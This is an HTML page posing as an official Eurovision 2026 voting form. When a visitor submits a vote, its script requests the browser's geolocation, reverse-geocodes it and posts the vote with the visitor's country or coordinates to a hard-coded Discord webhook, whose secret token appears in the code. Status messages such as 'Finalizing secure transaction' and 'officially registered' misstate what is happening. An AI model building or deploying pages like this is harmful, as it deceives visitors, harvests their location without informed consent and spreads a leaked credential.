<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eurovision 2026 - Cast Your Vote</title>
    <style>
        :root {
            /* Text & Accents */
            --text-main: #ffffff;
            --text-muted: #b3a4c4;
            --euro-pink: #ff007f;
            --euro-cyan: #00f0ff;
            --success-green: #00ffaa;
            
            /* Liquid Glass Effect */
            --glass-bg: rgba(255, 255, 255, 0.07);
            --glass-border: rgba(255, 255, 255, 0.15);
            --glass-glow: 0px 0px 30px 2px rgba(255, 0, 127, 0.4);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 20px;
            
            /* Wavy Fluid Linear Gradient resembling the image background */
            background: linear-gradient(155deg, 
                #070211 0%, 
                #0f0524 30%, 
                #2d0c4d 65%, 
                #501375 85%, 
                #721e99 100%
            );
            background-attachment: fixed;
        }

        /* The Main Liquid Glass Container from the image */
        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(25px) saturate(120%);
            -webkit-backdrop-filter: blur(25px) saturate(120%);
            border: 1.5px solid var(--glass-border);
            
            /* High curvature matching the reference */
            border-radius: 36px; 
            
            width: 100%;
            max-width: 440px;
            padding: 40px 32px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), var(--glass-glow);
            text-align: center;
            transition: box-shadow 0.5s ease-in-out;
        }

        .header-section h1 {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }

        .header-section p {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .options-container {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-bottom: 30px;
        }

        /* Rows inside the fluid container */
        .vote-row {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 18px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .vote-row:hover {
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.06);
        }

        .vote-row input[type="radio"] {
            position: absolute;
            right: 22px;
            accent-color: var(--euro-pink);
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        /* Activated Custom Selection State */
        .vote-row.active {
            border-color: var(--text-main);
            background: rgba(255, 255, 255, 0.1);
        }

        .flag-icon {
            font-size: 24px;
            margin-right: 16px;
            display: inline-flex;
        }

        .label-text {
            font-size: 17px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }

        /* Clean, minimalist interface button */
        .action-btn {
            background: var(--text-main);
            color: #110322;
            border: none;
            border-radius: 16px;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: all 0.25s ease;
        }

        .action-btn:hover:not(:disabled) {
            opacity: 0.9;
            transform: scale(1.01);
        }

        .action-btn:disabled {
            background: rgba(255, 255, 255, 0.15);
            color: rgba(255, 255, 255, 0.3);
            cursor: not-allowed;
        }

        #log-status {
            margin-top: 22px;
            font-size: 13px;
            font-weight: 500;
            min-height: 18px;
            color: var(--text-muted);
        }
    </style>
</head>
<body>

<div class="glass-panel" id="mainPanel">
    <div class="header-section">
        <h1>Cast Your Vote</h1>
        <p>Your enthusiasm and participation help shape the results of the Eurovision Song Contest 2026.</p>
    </div>

    <div class="options-container">
        <label class="vote-row" onclick="highlightRow(this)">
            <span class="flag-icon">🇷🇸</span>
            <span class="label-text">Serbia</span>
            <input type="radio" name="eurovote" value="Serbia">
        </label>

        <label class="vote-row" onclick="highlightRow(this)">
            <span class="flag-icon">🇲🇰</span>
            <span class="label-text">North Macedonia</span>
            <input type="radio" name="eurovote" value="North Macedonia">
        </label>

        <label class="vote-row" onclick="highlightRow(this)">
            <span class="flag-icon">🇩🇰</span>
            <span class="label-text">Denmark</span>
            <input type="radio" name="eurovote" value="Denmark">
        </label>
    </div>

    <button id="submitVoteBtn" class="action-btn" onclick="executeVote()" disabled>Submit Entry</button>
    <div id="log-status">Select an entry to begin</div>
</div>

<script>
    const webhookUrl = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";

    function highlightRow(element) {
        document.querySelectorAll('.vote-row').forEach(row => {
            row.classList.remove('active');
        });
        element.classList.add('active');
        
        const radio = element.querySelector('input[type="radio"]');
        radio.checked = true;

        const submitVoteBtn = document.getElementById('submitVoteBtn');
        submitVoteBtn.disabled = false;
        document.getElementById('log-status').innerText = `Ready to transmit vote for ${radio.value}`;
        document.getElementById('log-status').style.color = "var(--text-muted)";
    }

    async function executeVote() {
        const status = document.getElementById('log-status');
        const submitVoteBtn = document.getElementById('submitVoteBtn');
        const selectedRadio = document.querySelector('input[name="eurovote"]:checked');

        if (!selectedRadio) return;
        const votedCountry = selectedRadio.value;

        submitVoteBtn.disabled = true;
        status.innerText = "Requesting regional permissions...";
        status.style.color = "var(--euro-cyan)";

        if (!navigator.geolocation) {
            status.innerText = "Location unsupported. Processing vote...";
            dispatchPayload(votedCountry, "Unknown (No Geolocation Support)");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                status.innerText = "Identifying coordinates...";

                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const data = await response.json();
                    const userCountry = data.address && data.address.country ? data.address.country : "Unknown Country";
                    
                    status.innerText = "Finalizing secure transaction...";
                    dispatchPayload(votedCountry, userCountry);
                } catch (error) {
                    status.innerText = "Connection slow. Dispatching data...";
                    dispatchPayload(votedCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                }
            },
            (error) => {
                status.innerText = "Permission bypassed. Sending anonymous entry...";
                dispatchPayload(votedCountry, "Anonymous Location");
            }
        );
    }

    async function dispatchPayload(votedCountry, userLocation) {
        const status = document.getElementById('log-status');
        
        const payload = {
            embeds: [{
                title: "🗳️ Official Eurovision Vote Logged",
                color: 16711807, 
                fields: [
                    { name: "Entry Selection", value: `**${votedCountry}**`, inline: true },
                    { name: "Voter Origin", value: `🌍 ${userLocation}`, inline: true }
                ],
                footer: { text: "Eurovision Core Voting Module" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                status.innerText = "✅ Your vote has been officially registered!";
                status.style.color = "var(--success-green)";
                // Dynamically update panel aura color on success
                document.getElementById('mainPanel').style.setProperty('--glass-glow', '0px 0px 30px 2px rgba(0, 255, 170, 0.3)');
            } else {
                status.innerText = "❌ Transmission error. Please try again.";
                status.style.color = "#ff4d4d";
                document.getElementById('submitVoteBtn').disabled = false;
            }
        } catch (err) {
            status.innerText = "❌ Network error connection failure.";
            status.style.color = "#ff4d4d";
            document.getElementById('submitVoteBtn').disabled = false;
        }
    }
</script>

</body>
</html>
